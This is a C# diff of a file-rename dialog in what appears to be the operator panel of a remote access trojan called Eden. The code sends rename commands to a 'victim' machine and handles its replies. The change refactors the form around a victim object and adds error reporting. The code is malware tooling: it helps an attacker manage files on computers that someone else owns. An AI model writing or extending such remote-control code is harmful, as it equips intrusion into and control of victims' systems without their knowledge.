@@ -13,15 +13,24 @@ namespace Eden
 {
     public partial class frmFileRename : Form
     {
-        public clsClient m_clnt;
-        public string szVictimID;
+        public clsVictim m_victim { get; init; }
+        private string m_szCurrentDir { get; init; }
+        private string m_szSrcPath { get; init; }
 
-        public string m_szEntryName;
-        public bool m_bDirectory;
+        public frmFileRename(clsVictim victim, string szInitDir, string szSrcFilePath)
+        {
+            InitializeComponent();
+
+            m_victim = victim;
+            m_szCurrentDir = szInitDir;
+            m_szSrcPath = szSrcFilePath;
+
+            Text = "Rename";
+        }
 
         void Received(clsClient clnt, string szVictimID, List<string> aMsg)
         {
-            if (this.szVictimID != szVictimID)
+            if (!string.Equals(m_victim.m_szID, szVictimID))
                 return;
 
             if (aMsg[0] == "file")
@@ -34,19 +43,17 @@ namespace Eden
                         MessageBox.Show("Rename successfully", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         Close();
                     }
+                    else
+                    {
+                        MessageBox.Show(aMsg[3], "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
                 }
             }
         }
 
-        public frmFileRename()
-        {
-            InitializeComponent();
-        }
-
         void setup()
         {
-            textBox1.Text = m_szEntryName;
-            m_clnt.ServerMessageReceived += Received;
+            m_victim.m_clnt.ServerMessageReceived += Received;
         }
 
         private void frmFileRename_Load(object sender, EventArgs e)
@@ -61,18 +68,27 @@ namespace Eden
                 MessageBox.Show("Name cannot be null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
-            if (string.Equals(m_szEntryName, textBox1.Text, StringComparison.OrdinalIgnoreCase))
+            if (string.Equals(m_szSrcPath, textBox1.Text, StringComparison.OrdinalIgnoreCase))
             {
                 MessageBox.Show("Name is same as before.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
 
-            m_clnt.SendVictim(szVictimID, $"File|rename|{m_szEntryName}|{textBox1.Text}");
+            string szSrcFilePath = m_szSrcPath;
+            string szDstFilePath = Path.Combine(m_szCurrentDir, textBox1.Text).Replace("\\\\", "\\").Replace("\\", "/");
+
+            m_victim.fnSendCommand(new string[]
+            {
+                "File",
+                "rename",
+                szSrcFilePath,
+                szDstFilePath,
+            });
         }
 
         private void frmFileRename_FormClosed(object sender, FormClosedEventArgs e)
         {
-            m_clnt.ServerMessageReceived -= Received;
+            m_victim.m_clnt.ServerMessageReceived -= Received;
         }
     }
 }
